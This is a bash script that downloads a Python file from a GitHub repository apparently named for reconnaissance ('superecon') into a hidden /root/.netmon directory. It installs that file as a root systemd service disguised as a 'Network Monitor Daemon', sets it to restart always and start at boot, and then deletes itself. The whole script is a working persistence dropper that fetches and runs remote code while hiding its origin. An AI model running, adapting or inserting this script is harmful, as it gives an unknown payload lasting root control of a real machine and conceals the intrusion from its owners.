#!/bin/bash
URL="https://raw.githubusercontent.com/mimikr00t/superecon/refs/heads/main/modules/core.py"
DIR="/root/.netmon"
FILE="$DIR/gd.py"
SERVICE="/etc/systemd/system/netmon.service"
PY="$(which python3)"

mkdir -p "$DIR" && chmod 700 "$DIR"
curl -s "$URL" -o "$FILE" && chmod 700 "$FILE"

cat <<EOF > "$SERVICE"
[Unit]
Description=Network Monitor Daemon
After=network.target

[Service]
Type=simple
ExecStart=$PY $FILE
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable netmon.service
systemctl start netmon.service

rm -- "$0"

